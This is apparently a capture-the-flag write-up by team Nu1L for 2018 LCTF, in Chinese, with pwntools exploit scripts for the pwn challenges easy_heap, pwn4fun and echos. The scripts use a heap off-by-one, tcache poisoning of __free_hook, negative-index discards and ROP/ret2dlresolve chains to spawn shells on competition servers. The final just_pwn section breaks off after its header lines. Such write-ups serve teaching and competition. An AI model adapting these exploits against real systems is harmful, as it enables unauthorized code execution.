# 2018 LCTF
> By Nu1L
[TOC]
比赛网址：  
比赛时间：2018/11/17 9:00-2018/11.18 21:00  
Team Page：
* * *
## PWN
### easy_heap
read_n函数存在off by one null
    from pwn import *
    def add(size,data):
        p.recvuntil('>')
        p.sendline('1')
        p.recvuntil('size')
        p.sendline(str(size))
        p.recvuntil('content')
        p.send(data)
    def dele(index):
        p.recvuntil('>')
        p.sendline('2')
        p.recvuntil('index')
        p.sendline(str(index))
    #p=process('./easy_heap')#,env={'LD_PRELOAD':'./libc64.so'})
    p=remote('118.25.150.134', 6666) 
    libc = ELF('./libc64.so')
    for i in range(10):
        add(0xf0,'aaa\n')
    dele(1)
    for i in range(3,8):
        dele(i)
    dele(9)
    dele(8)
    dele(2)
    dele(0)
    for i in range(7):
        add(0xf0,'aaa\n')
    add(0,'')
    add(0xf8,'\n')
    dele(0)
    dele(1)
    dele(2)
    dele(3)
    dele(4)
    dele(6)
    dele(5)
    for i in range(7):
        add(16,'/bin/bash\n')
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil("index \n> ")
    p.sendline('8')
    addr = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = addr - (0x00007f97e7321ca0-0x7f97e6f36000)
    info(hex(libc_base))
    free_hook = libc_base+libc.symbols['__free_hook']
    #sys = libc_base + libc.symbols['system']
    sys = libc_base +0x4f322
    info(hex(sys))
    info(hex(free_hook))
    add(0,'')
    dele(5)
    dele(8)
    dele(9)
    add(16,p64(free_hook)+'\n')
    add(16,'/bin/bash\x00')
    add(16,p64(sys)+'\n')
    dele(0)
    p.interactive()
### pwn4fun
概率性exp  
能不能出flag看脸
    from pwn import *
    context.log_level = 'debug'
    def sigin(p, username):
        p.recvuntil('sign (I)n or sign (U)p?')
        p.sendline('I')
        p.recvuntil('input your name')
        p.send(username)
    def choose(p, c):
        p.recvuntil('4. do nothing')
        p.sendline(str(c))
    def pwn(p):
        count = 0
        p.recvuntil('press enter to start game')
        p.send('\n')
        #gdb.attach(p)
        sigin(p, 'admin'.ljust(9, '\x00'))
        choose(p, 1)
        while True:
            p.recvuntil('----turn ')
            turn = int(p.recvuntil('-', drop=True))
            log.info('turn: {}'.format(turn))
            p.recvuntil('this is your e_cards\n')
            card_str = p.recvuntil('\n')
            guard_num = card_str.count('Guard')
            peach_num = card_str.count('Peach')
            attack_num = card_str.count('Attack')
            card_num = guard_num + peach_num + attack_num
            my_card = card_str.split(' ')
            try:
                first = my_card[1]
            except:
                first = ''
            log.info('guard:{} peach:{} attack:{}'.format(guard_num, peach_num, attack_num))
            log.info('count:{}'.format(count))
            p.recvuntil('your health is ')
            health = int(p.recvuntil('\n', drop=True))
            log.info('health:{}'.format(health))
            p.recvuntil('enemy e_cards: ')
            enemy_card = int(p.recvuntil(' ', drop=True))
            p.recvuntil('enemy health: ')
            enemy_health = int(p.recvuntil('\n', drop=True))
            log.info('enemy_card:{} enemy_health:{}'.format(enemy_card, enemy_health))
            # always attack
            p.recvuntil('3. Pass\n')
            if attack_num != 0 and enemy_health > 0 and not (first == 'Attack' and count == 0):
                p.sendline('1')
                p.recvuntil(': Attack!\n')
                p.recvuntil('COM: ')
                p.recvuntil('\n')
                card_num -= 1
            elif peach_num != 0 and health != 7 and count != 6:
                p.sendline('2')
                p.recvuntil(': eat a peach and +1 health\n')
                card_num -= 1
                health += 1
            else:
                p.sendline('3')
            if card_num > health:
                p.recvuntil('put the e_card number you want to throw\n')
                p.sendline(str(card_num))
                card_num -= 1
                if card_num - health:
                    p.recvuntil('put the e_card number you want to throw\n')
                    if first == 'Attack' and card_num != 0 and count == 0:
                        p.sendline('-5')
                        count += 1
                    elif first == 'Guard' and card_num != 0 and count == 1:
                        p.sendline('-5')
                        count += 1
                    elif count > 1 and count < 6:
                        p.sendline('-5')
                        count += 1
                    else:
                        p.sendline(str(card_num))
            #data = p.recvuntil('\n')
            # if data == "you don't have a attack e_card!\n":
            #     p.recvuntil('put the e_card number you want to throw\n')
            #     p.sendline('1')
            p.recvuntil('------your turn is over-------\n')
            p.recvuntil("it's my turn, draw!\n")
            data = p.recv(1)
            if data == '-':
                continue
            data = p.recvuntil('\n')
            if 'eat' in data:
                data = p.recv(1)
                if data == '-':
                    continue
                p.recvuntil('\n')
            data = p.recv(1)
            if data != 'd':
                p.recvuntil(': -1 health\n')
                if p.recv(1) == 'y':
                    return False
                    p.interactive()
                continue
            p.recvuntil('guard?[0/1]\n')
            if health <= 4 and count != 6:
                p.sendline('1')
            else:
                p.sendline('0')
                p.recvuntil(': -1 health\n')
                data = p.recv(1)
                if data != '-':
                    break
        p.recvuntil('one more?(0/1)')
        p.sendline('1')
        sigin(p, 'admin'.ljust(9, '\x00'))
        p.interactive()
    if __name__ == '__main__':
        #p = remote('212.64.75.161', 2333)
        while True:
            p = remote('212.64.75.161', 2333)
            #p = process('sgs')
            #gdb.attach(p)
            if pwn(p):
                break
            p.close()
        #gdb.attach(p)
        p.interactive()
弃牌的时候第二次弃牌没有检查负数
### echos
可以盖stdin stdout stderr指针
长度超过可写区时 read 返回-1 直到指针向前移到可以写入这么长的内容为止 可以改掉stdin stdout stderr指针
    from pwn import *
    p = process('./echos', env = {'LD_PRELOAD': './libc64.so'})
    #p = remote('172.81.214.122', 6666)
    p.sendline(str(0xc40).ljust(8, '\x00') + p64(0x4013c3) + p64(0x403390) + p64(0x401030) + p64(0x4013c1) + p64(0x401030) + p64(0x444444) + p64(0x401307))
    p.recvuntil('size is 3136')
    payload = (p64(0x4013bd) + p64(0x4013bc)).ljust(0xc3f, 'A')
    #raw_input()
    p.send(payload)
    p.sendline()
    #p.interactive()
    p.recvuntil('enter the size:\n')
    puts_addr = u64(p.recvline().strip().ljust(8, '\x00'))
    libc_addr = puts_addr - 0x6f690
    print hex(libc_addr)
    scanf = libc_addr + 0x6a7e0
    system = libc_addr + 0x45390
    one = libc_addr + 0x4526a
    p.send((p64(system) + p64(one)).ljust(0xc40, 'A'))
    p.interactive()
交过去的writeup是这个 orz  
打的relro，不需要leak
    from pwn import *
    context.log_level = 'debug'
    context.arch = 'amd64'
    def pwn(p):
        #gdb.attach(p)
        p.recvuntil('enter the size:')
        payload = str(0xc40)
        payload = payload.ljust(8, '\x00')
        # 0x00000000004013c3 : pop rdi ; ret
        payload += flat([0x00000000004013c3, 0x404000 - 0x100])
        payload += p64(0x40103B)
        payload += p64(0x25b) # idx
        payload += p64(0xdeadbeffdeadbeff) # retaddr
        p.sendline(payload)
        p.recvuntil('size is ')
        p.recvuntil('\n')
        payload = p64(0xdeadbeffdeadbeff) # atoi got
        payload += p64(0x4013BC) # scanf got
        payload = payload.ljust(0xb40, 'b')
        payload += '/bin/sh\x00'
        payload += '\x00'*8
        payload += p64(0x4033C0) + p32(0x7) + p32(0x282) + p64(0)
        payload += '\x00'*8
        payload += p32(15024) + p32(0x12) + p64(0) + p64(0)
        payload += 'system\x00'
        payload = payload.ljust(0xc40, 'a')
        #payload += '\n'
        #payload += 'a'*0x5000
        p.send(payload)
        sleep(1)
        p.sendline('')
        p.interactive()
    if __name__ == '__main__':
        p = process('./echos')
        #p = remote('172.81.214.122', 6666)
        pwn(p)
### just_pwn
前面有个莫名其妙的块加密算法，但是不管怎么加密用`time(0)`做随机数种子都是硬伤。后面有个栈溢出，没仔细看，爆就完事了。
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    